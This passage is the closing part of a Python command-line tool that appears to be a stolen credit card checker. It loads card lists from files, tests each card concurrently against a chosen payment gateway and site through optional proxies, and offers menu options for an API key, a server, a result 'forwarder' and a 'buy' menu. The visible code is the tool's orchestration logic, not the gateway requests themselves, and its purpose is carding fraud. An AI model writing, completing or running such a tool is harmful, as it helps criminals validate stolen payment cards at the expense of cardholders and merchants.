    print(f"{Colors.CYAN}ENTER CARD FILES (COMMA SEPARATED):{Colors.RESET}")
    filesInput = input(f"{Colors.WHITE}FILES: {Colors.RESET}").strip()
    
    if not filesInput:
        print(f"{Colors.RED}[-] NO FILES ENTERED{Colors.RESET}")
        time.sleep(2)
        return
    
    files = [f.strip() for f in filesInput.split(',')]
    
    clearScreen()
    printBanner()
    
    print(f"{Colors.GREEN}[+] LOADING CARDS...{Colors.RESET}")
    cards = loadCards(files)
    
    if not cards:
        print(f"{Colors.RED}[-] NO CARDS LOADED{Colors.RESET}")
        time.sleep(2)
        return
    
    print(f"{Colors.GREEN}[+] LOADED {len(cards)} CARDS{Colors.RESET}")
    print(f"{Colors.GREEN}[+] GATEWAY: {gateway.upper()}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] THREADS: {DEFAULT_THREADS}{Colors.RESET}")
    
    proxy_status = "ENABLED" if config.get('proxy_enabled') and config.get('proxy') else "NONE"
    print(f"{Colors.GREEN}[+] PROXY: {proxy_status}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] STARTING CHECK...{Colors.RESET}\n")
    
    checkStats['total'] = len(cards)
    time.sleep(1)
    
    try:
        with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
            futures = [executor.submit(checkCard, card, selectedSite, gateway, config, siteLabel) for card in cards]
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass
    except KeyboardInterrupt:
        print(f"\n{Colors.ORANGE}[!] CHECK INTERRUPTED BY USER{Colors.RESET}")
    
    showSummary()
    input(f"\n{Colors.WHITE}PRESS ENTER TO CONTINUE...{Colors.RESET}")

def main():
    initDirectories()
    installDependencies()
    
    while True:
        printMenu()
        choice = input(f"{Colors.WHITE}CHOOSE: {Colors.RESET}").strip()
        
        if choice == '1':
            startChecker()
        elif choice == '2':
            configureApiKey()
        elif choice == '3':
            configureServer()
        elif choice == '4':
            configureSites()
        elif choice == '5':
            configureProxy()
        elif choice == '6':
            configureForwarder()
        elif choice == '7':
            showBuyMenu()
        elif choice == '8':
            clearScreen()
            print(f"{Colors.CYAN}GOODBYE!{Colors.RESET}")
            break
        else:
            print(f"{Colors.RED}[-] INVALID CHOICE{Colors.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clearScreen()
        print(f"\n{Colors.CYAN}GOODBYE!{Colors.RESET}")